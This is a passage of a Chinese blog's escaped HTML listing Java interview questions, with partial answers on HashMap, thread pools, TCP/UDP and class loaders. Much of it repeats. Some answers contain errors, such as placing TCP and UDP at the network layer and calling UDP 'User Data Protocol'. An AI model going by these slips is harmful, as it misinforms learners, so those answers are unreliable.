创建一个定长线程池，支持定时及周期性任务执行</li>\n<li>newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行）</li>\n</ul>\n<h4 id=\"5、TCP-UDP区别\"><a href=\"#5、TCP-UDP区别\" class=\"headerlink\" title=\"5、TCP/UDP区别\"></a>5、TCP/UDP区别</h4><p><strong>相同点</strong>： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>TCP</th>\n<th>UDP</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>Transmission Control Protocol 传输控制协议</td>\n<td>User Data Protocol 用户数据报协议</td>\n</tr>\n<tr>\n<td>2</td>\n<td>TCP的传输是可靠传输</td>\n<td>UDP的传输是不可靠传输</td>\n</tr>\n<tr>\n<td>3</td>\n<td>TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接</td>\n<td>UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去</td>\n</tr>\n<tr>\n<td>4</td>\n<td>TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信</td>\n<td>UDP是一种不可靠的网络服务，负载相对较小</td>\n</tr>\n<tr>\n<td>5</td>\n<td>TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息</td>\n<td>UDP包含长度和检验和信息</td>\n</tr>\n<tr>\n<td>6</td>\n<td>TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端</td>\n<td>UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端</td>\n</tr>\n<tr>\n<td>7</td>\n<td>TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢</td>\n<td>UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快</td>\n</tr>\n<tr>\n<td>8</td>\n<td>TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制</td>\n<td>UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"6、查找一个数组的中位数\"><a href=\"#6、查找一个数组的中位数\" class=\"headerlink\" title=\"6、查找一个数组的中位数\"></a>6、查找一个数组的中位数</h4><h4 id=\"7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\"><a href=\"#7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\" class=\"headerlink\" title=\"7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\"></a>7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。</h4><h4 id=\"8、Object类中的方法\"><a href=\"#8、Object类中的方法\" class=\"headerlink\" title=\"8、Object类中的方法\"></a>8、Object类中的方法</h4><h4 id=\"9、对象比较是否相等\"><a href=\"#9、对象比较是否相等\" class=\"headerlink\" title=\"9、对象比较是否相等\"></a>9、对象比较是否相等</h4><h4 id=\"10、toString方法的常用地方，为什么要重写该方法\"><a href=\"#10、toString方法的常用地方，为什么要重写该方法\" class=\"headerlink\" title=\"10、toString方法的常用地方，为什么要重写该方法\"></a>10、toString方法的常用地方，为什么要重写该方法</h4><h4 id=\"11、HashMap-put方法怎么判断是否是重复方法\"><a href=\"#11、HashMap-put方法怎么判断是否是重复方法\" class=\"headerlink\" title=\"11、HashMap put方法怎么判断是否是重复方法\"></a>11、HashMap put方法怎么判断是否是重复方法</h4><h4 id=\"12、Set和List的区别\"><a href=\"#12、Set和List的区别\" class=\"headerlink\" title=\"12、Set和List的区别\"></a>12、Set和List的区别</h4><h4 id=\"13、ArrayList和LinkedList的区别，List和Map的区别，-ArrayList和Vector的区别\"><a href=\"#13、ArrayList和LinkedList的区别，List和Map的区别，-ArrayList和Vector的区别\" class=\"headerlink\" title=\"13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别\"></a>13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别</h4><h4 id=\"14、TreeSet对存入的数据有什么要求吗？\"><a href=\"#14、TreeSet对存入的数据有什么要求吗？\" class=\"headerlink\" title=\"14、TreeSet对存入的数据有什么要求吗？\"></a>14、TreeSet对存入的数据有什么要求吗？</h4><h4 id=\"15、HashSet是不是线程安全的\"><a href=\"#15、HashSet是不是线程安全的\" class=\"headerlink\" title=\"15、HashSet是不是线程安全的\"></a>15、HashSet是不是线程安全的</h4><h4 id=\"16、Java中有哪些线程安全的Map\"><a href=\"#16、Java中有哪些线程安全的Map\" class=\"headerlink\" title=\"16、Java中有哪些线程安全的Map\"></a>16、Java中有哪些线程安全的Map</h4><h4 id=\"17、CocurrentHashMap是怎么做到线程安全的\"><a href=\"#17、CocurrentHashMap是怎么做到线程安全的\" class=\"headerlink\" title=\"17、CocurrentHashMap是怎么做到线程安全的\"></a>17、CocurrentHashMap是怎么做到线程安全的</h4><h4 id=\"18、如何保证线程安全问题\"><a href=\"#18、如何保证线程安全问题\" class=\"headerlink\" title=\"18、如何保证线程安全问题\"></a>18、如何保证线程安全问题</h4><h4 id=\"19、volatile原子性问题？为什么i-不支持原子性\"><a href=\"#19、volatile原子性问题？为什么i-不支持原子性\" class=\"headerlink\" title=\"19、volatile原子性问题？为什么i++不支持原子性\"></a>19、volatile原子性问题？为什么i++不支持原子性</h4><h4 id=\"20、CAS操作\"><a href=\"#20、CAS操作\" class=\"headerlink\" title=\"20、CAS操作\"></a>20、CAS操作</h4><h4 id=\"21、lock和synchronized区别\"><a href=\"#21、lock和synchronized区别\" class=\"headerlink\" title=\"21、lock和synchronized区别\"></a>21、lock和synchronized区别</h4><h4 id=\"22、公平锁和非公平锁\"><a href=\"#22、公平锁和非公平锁\" class=\"headerlink\" title=\"22、公平锁和非公平锁\"></a>22、公平锁和非公平锁</h4><h4 id=\"23、Java读写锁，读写锁解决的问题\"><a href=\"#23、Java读写锁，读写锁解决的问题\" class=\"headerlink\" title=\"23、Java读写锁，读写锁解决的问题\"></a>23、Java读写锁，读写锁解决的问题</h4><h4 id=\"24、线程池的原理，为什么要创建线程池？创建线程池的方式？\"><a href=\"#24、线程池的原理，为什么要创建线程池？创建线程池的方式？\" class=\"headerlink\" title=\"24、线程池的原理，为什么要创建线程池？创建线程池的方式？\"></a>24、线程池的原理，为什么要创建线程池？创建线程池的方式？</h4><p>使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能</p>\n<h4 id=\"25、线程的生命周期，什么时候会出现僵死进程？\"><a href=\"#25、线程的生命周期，什么时候会出现僵死进程？\" class=\"headerlink\" title=\"25、线程的生命周期，什么时候会出现僵死进程？\"></a>25、线程的生命周期，什么时候会出现僵死进程？</h4><h4 id=\"26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\"><a href=\"#26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\" class=\"headerlink\" title=\"26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\"></a>26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？</h4><h4 id=\"27、volatile、ThreadLocal的使用场景和原理\"><a href=\"#27、volatile、ThreadLocal的使用场景和原理\" class=\"headerlink\" title=\"27、volatile、ThreadLocal的使用场景和原理\"></a>27、volatile、ThreadLocal的使用场景和原理</h4><h4 id=\"28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\"><a href=\"#28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\" class=\"headerlink\" title=\"28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\"></a>28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。</h4><h4 id=\"29、JVM内存模型、GC机制和原理\"><a href=\"#29、JVM内存模型、GC机制和原理\" class=\"headerlink\" title=\"29、JVM内存模型、GC机制和原理\"></a>29、JVM内存模型、GC机制和原理</h4><h4 id=\"30、GC分那两种，Minor-GC和Full-GC有什么区别，什么情况下会触发Full-GC，分别采用什么算法。\"><a href=\"#30、GC分那两种，Minor-GC和Full-GC有什么区别，什么情况下会触发Full-GC，分别采用什么算法。\" class=\"headerlink\" title=\"30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。\"></a>30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。</h4><h4 id=\"31、JVM里有几种classloader，为什么会有多种。\"><a href=\"#31、JVM里有几种classloader，为什么会有多种。\" class=\"headerlink\" title=\"31、JVM里有几种classloader，为什么会有多种。\"></a>31、JVM里有几种classloader，为什么会有多种。</h4><p>JVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。</p>\n<p>他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。</p>\n<p>当执行java *.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。</p>\n<h4 id=\"32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\"><a href=\"#32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\" class=\"headerlink\" title=\"32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\"></a>32、什么是双亲委派机制，介绍双亲委派的运作过程和好处</h4><p>双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。</p>\n<p>采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。</p>\n<h4 id=\"33、什么情况下需要破坏双亲委派机制\"><a href=\"#33、什么情况下需要破坏双亲委派机制\" class=\"headerlink\" title=\"33、什么情况下需要破坏双亲委派机制\"></a>33、什么情况下需要破坏双亲委派机制</h4><p>1、基础类调用用户代码</p>\n<p>双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。</p>\n<p>为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。</p>\n<p>2、OSGi模块化热部署</p>\n<p>OSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。</p>\n<h4 id=\"34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\"><a href=\"#34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\" class=\"headerlink\" title=\"34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\"></a>34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。</h4><h4 id=\"35、红黑树的实现原理和应用场景\"><a href=\"#35、红黑树的实现原理和应用场景\" class=\"headerlink\" title=\"35、红黑树的实现原理和应用场景\"></a>35、红黑树的实现原理和应用场景</h4><h4 id=\"36、NIO是什么，适用于何种场景\"><a href=\"#36、NIO是什么，适用于何种场景\" class=\"headerlink\" title=\"36、NIO是什么，适用于何种场景\"></a>36、NIO是什么，适用于何种场景</h4><h4 id=\"37、\"><a href=\"#37、\" class=\"headerlink\" title=\"37、\"></a>37、</h4><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1、HashMap和HashTable区别\"><a href=\"#1、HashMap和HashTable区别\" class=\"headerlink\" title=\"1、HashMap和HashTable区别\"></a>1、HashMap和HashTable区别</h4><p>HashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能</p>\n<ul>\n<li>HashTable继承Dictionary，HashMap继承的是java2出现的Map接口；</li>\n<li>HashMap允许将null作为key或value，hashtable不允许；</li>\n<li>HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好；</li>\n<li>由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable；</li>\n<li>HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。</li>\n<li>HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey</li>\n<li>HashTable中数组默认大小是11，扩容方法是old*2+1;HashMap默认大小是16，扩容每次为2的指数大小</li>\n</ul>\n<h4 id=\"2、Object的hashcode方法，equals方法，常用的地方\"><a href=\"#2、Object的hashcode方法，equals方法，常用的地方\" class=\"headerlink\" title=\"2、Object的hashcode方法，equals方法，常用的地方\"></a>2、Object的hashcode方法，equals方法，常用的地方</h4><h4 id=\"3、HashMap的原理应用场景\"><a href=\"#3、HashMap的原理应用场景\" class=\"headerlink\" title=\"3、HashMap的原理应用场景\"></a>3、HashMap的原理应用场景</h4><p>简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。</p>\n<h4 id=\"4、JDK中有哪些线程池\"><a href=\"#4、JDK中有哪些线程池\" class=\"headerlink\" title=\"4、JDK中有哪些线程池\"></a>4、JDK中有哪些线程池</h4><p>Java中通过Executors提供四种线程池：</p>\n<ul>\n<li>newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。</li>\n<li>newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待</li>\n<li>newScheduleThreadPool： 创建一个定长线程池，支持定时及周期性任务执行</li>\n<li>newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行）</li>\n</ul>\n<h4 id=\"5、TCP-UDP区别\"><a href=\"#5、TCP-UDP区别\" class=\"headerlink\" title=\"5、TCP/UDP区别\"></a>5、TCP/UDP区别</h4><p><strong>相同点</strong>： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>TCP</th>\n<th>UDP</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>Transmission Control Protocol 传输控制协议</td>\n<td>User Data Protocol 用户数据报协议</td>\n</tr>\n<tr>\n<td>2</td>\n<td>TCP的传输是可靠传输</td>\n<td>UDP的传输是不可靠传输</td>\n</tr>\n<tr>\n<td>3</td>\n<td>TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接</td>\n<td>UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去</td>\n</tr>\n<tr>\n<td>4</td>\n<td>TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信</td>\n<td>UDP是一种不可靠的网络服务，负载相对较小</td>\n</tr>\n<tr>\n<td>5</td>\n<td>TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息</td>\n<td>UDP包含长度和检验和信息</td>\n</tr>\n<tr>\n<td>6</td>\n<td>TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端</td>\n<td>UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端</td>\n</tr>\n<tr>\n<td>7</td>\n<td>TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢</td>\n<td>UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快</td>\n</tr>\n<tr>\n<td>8</td>\n<td>TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制</td>\n<td>UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"6、查找一个数组的中位数\"><a href=\"#6、查找一个数组的中位数\" class=\"headerlink\" title=\"6、查找一个数组的中位数\"></a>6、查找一个数组的中位数</h4><h4 id=\"7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\"><a href=\"#7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\" class=\"headerlink\" title=\"7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\"></a>7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。</h4><h4 id=\"8、Object类中的方法\"><a href=\"#8、Object类中的方法\" class=\"headerlink\" title=\"8、Object类中的方法\"></a>8、Object类中的方法</h4><h4 id=\"9、对象比较是否相等\"><a href=\"#9、对象比较是否相等\" class=\"headerlink\" title=\"9、对象比较是否相等\"></a>9、对象比较是否相等</h4><h4 id=\"10、toString方法的常用地方，为什么要重写该方法\"><a href=\"#10、toString方法的常用地方，为什么要重写该方法\" class=\"headerlink\" title=\"10、toString方法的常用地方，为什么要重写该方法\"></a>10、toString方法的常用地方，为什么要重写该方法</h4><h4 id=\"11、HashMap-put方法怎么判断是否是重复方法\"><a href=\"#11、HashMap-put方法怎么判断是否是重复方法\" class=\"headerlink\" title=\"11、HashMap put方法怎么判断是否是重复方法\"></a>11、HashMap put方法怎么判断是否是重复方法</h4><h4 id=\"12、Set和List的区别\"><a href=\"#12、Set和List的区别\" class=\"headerlink\" title=\"12、Set和List的区别\"></a>12、Set和List的区别</h4><h4 id=\"13、ArrayList和LinkedList的区别，List和Map的区别，-ArrayList和Vector的区别\"><a href=\"#13、ArrayList和LinkedList的区别，List和Map的区别，-ArrayList和Vector的区别\" class=\"headerlink\" title=\"13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别\"></a>13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别</h4><h4 id=\"14、TreeSet对存入的数据有什么要求吗？\"><a href=\"#14、TreeSet对存入的数据有什么要求吗？\" class=\"headerlink\" title=\"14、TreeSet对存入的数据有什么要求吗？\"></a>14、TreeSet对存入的数据有什么要求吗？</h4><h4 id=\"15、HashSet是不是线程安全的\"><a href=\"#15、HashSet是不是线程安全的\" class=\"headerlink\" title=\"15、HashSet是不是线程安全的\"></a>15、HashSet是不是线程安全的</h4><h4 id=\"16、Java中有哪些线程安全的Map\"><a href=\"#16、Java中有哪些线程安全的Map\" class=\"headerlink\" title=\"16、Java中有哪些线程安全的Map\"></a>16、Java中有哪些线程安全的Map</h4><h4 id=\"17、CocurrentHashMap是怎么做到线程安全的\"><a href=\"#17、CocurrentHashMap是怎么做到线程安全的\" class=\"headerlink\" title=\"17、CocurrentHashMap是怎么做到线程安全的\"></a>17、CocurrentHashMap是怎么做到线程安全的</h4><h4 id=\"18、如何保证线程安全问题\"><a href=\"#18、如何保证线程安全问题\" class=\"headerlink\" title=\"18、如何保证线程安全问题\"></a>18、如何保证线程安全问题</h4><h4 id=\"19、volatile原子性问题？为什么i-不支持原子性\"><a href=\"#19、volatile原子性问题？为什么i-不支持原子性\" class=\"headerlink\" title=\"19、volatile原子性问题？为什么i++不支持原子性\"></a>19、volatile原子性问题？为什么i++不支持原子性</h4><h4 id=\"20、CAS操作\"><a href=\"#20、CAS操作\" class=\"headerlink\" title=\"20、CAS操作\"></a>20、CAS操作</h4><h4 id=\"21、lock和synchronized区别\"><a href=\"#21、lock和synchronized区别\" class=\"headerlink\" title=\"21、lock和synchronized区别\"></a>21、lock和synchronized区别</h4><h4 id=\"22、公平锁和非公平锁\"><a href=\"#22、公平锁和非公平锁\" class=\"headerlink\" title=\"22、公平锁和非公平锁\"></a>22、公平锁和非公平锁</h4><h4 id=\"23、Java读写锁，读写锁解决的问题\"><a href=\"#23、Java读写锁，读写锁解决的问题\" class=\"headerlink\" title=\"23、Java读写锁，读写锁解决的问题\"></a>23、Java读写锁，读写锁解决的问题</h4><h4 id=\"24、线程池的原理，为什么要创建线程池？创建线程池的方式？\"><a href=\"#24、线程池的原理，为什么要创建线程池？创建线程池的方式？\" class=\"headerlink\" title=\"24、线程池的原理，为什么要创建线程池？创建线程池的方式？\"></a>24、线程池的原理，为什么要创建线程池？创建线程池的方式？</h4><p>使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能</p>\n<h4 id=\"25、线程的生命周期，什么时候会出现僵死进程？\"><a href=\"#25、线程的生命周期，什么时候会出现僵死进程？\" class=\"headerlink\" title=\"25、线程的生命周期，什么时候会出现僵死进程？\"></a>25、线程的生命周期，什么时候会出现僵死进程？</h4><h4 id=\"26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\"><a href=\"#26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\" class=\"headerlink\" title=\"26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\"></a>26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？</h4><h4 id=\"27、volatile、ThreadLocal的使用场景和原理\"><a href=\"#27、volatile、ThreadLocal的使用场景和原理\" class=\"headerlink\" title=\"27、volatile、ThreadLocal的使用场景和原理\"></a>27、volatile、ThreadLocal的使用场景和原理</h4><h4 id=\"28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\"><a href=\"#28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\" class=\"headerlink\" title=\"28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\"></a>28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。</h4><h4 id=\"29、JVM内存模型、GC机制和原理\"><a href=\"#29、JVM内存模型、GC机制和原理\" class=\"headerlink\" title=\"29、JVM内存模型、GC机制和原理\"></a>29、JVM内存模型、GC机制和原理</h4><h4 id=\"30、GC分那两种，Minor-GC和Full-GC有什么区别，什么情况下会触发Full-GC，分别采用什么算法。\"><a href=\"#30、GC分那两种，Minor-GC和Full-GC有什么区别，什么情况下会触发Full-GC，分别采用什么算法。\" class=\"headerlink\" title=\"30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。\"></a>30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。</h4><h4 id=\"31、JVM里有几种classloader，为什么会有多种。\"><a href=\"#31、JVM里有几种classloader，为什么会有多种。\" class=\"headerlink\" title=\"31、JVM里有几种classloader，为什么会有多种。\"></a>31、JVM里有几种classloader，为什么会有多种。</h4><p>JVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。</p>\n<p>他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。</p>\n<p>当执行java *.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。</p>\n<h4 id=\"32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\"><a href=\"#32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\" class=\"headerlink\" title=\"32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\"></a>32、什么是双亲委派机制，介绍双亲委派的运作过程和好处</h4><p>双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。</p>\n<p>采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。</p>\n<h4 id=\"33、什么情况下需要破坏双亲委派机制\"><a href=\"#33、什么情况下需要破坏双亲委派机制\" class=\"headerlink\" title=\"33、什么情况下需要破坏双亲委派机制\"></a>33、什么情况下需要破坏双亲委派机制</h4><p>1、基础类调用用户代码</p>\n<p>双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。</p>\n<p>为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。</p>\n<p>2、OSGi模块化热部署</p>\n<p>OSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。</p>\n<h4 id=\"34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\"><a href=\"#34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\" class=\"headerlink\" title=\"34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\"></a>34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。</h4><h4 id=\"35、红黑树的实现原理和应用场景\"><a href=\"#35、红黑树的实现原理和应用场景\" class=\"headerlink\" title=\"35、红黑树的实现原理和应用场景\"></a>35、红黑树的实现原理和应用场景</h4><h4 id=\"36、NIO是什么，适用于何种场景\"><a href=\"#36、NIO是什么，适用于何种场景\" class=\"headerlink\" title=\"36、NIO是什么，适用于何种场景\"></a>36、NIO是什么，适用于何种场景</h4><h4 id=\"37、\"><a href=\"#37、\" class=\"headerlink\" title=\"37、\"></a>37、</h4><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins 